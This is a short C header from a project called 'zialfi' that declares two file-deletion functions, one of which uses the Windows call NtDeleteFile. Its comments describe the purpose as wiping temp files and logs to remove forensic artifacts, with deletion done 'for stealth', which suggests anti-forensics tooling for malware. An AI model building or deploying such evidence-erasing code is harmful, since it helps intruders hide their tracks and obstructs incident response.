/*
 * temp_wipe.h — Temporary file cleanup for zialfi
 *
 * Wipes TMP/TEMP directories to remove forensic artifacts.
 * Translated from Mirage Zig temp_wipe.zig.
 */

#ifndef ZIALFI_TEMP_WIPE_H
#define ZIALFI_TEMP_WIPE_H

#ifdef __cplusplus
extern "C" {
#endif

/*
 * temp_wipe_directory — Delete common temp file patterns
 * (*.tmp, *.log, ~*, *.bak) from the system temp directory.
 */
void temp_wipe_directory(void);

/*
 * temp_wipe_file — Delete a single file by path.
 * Uses NT NtDeleteFile for stealth.
 */
void temp_wipe_file(const char *path);

#ifdef __cplusplus
}
#endif

#endif /* ZIALFI_TEMP_WIPE_H */
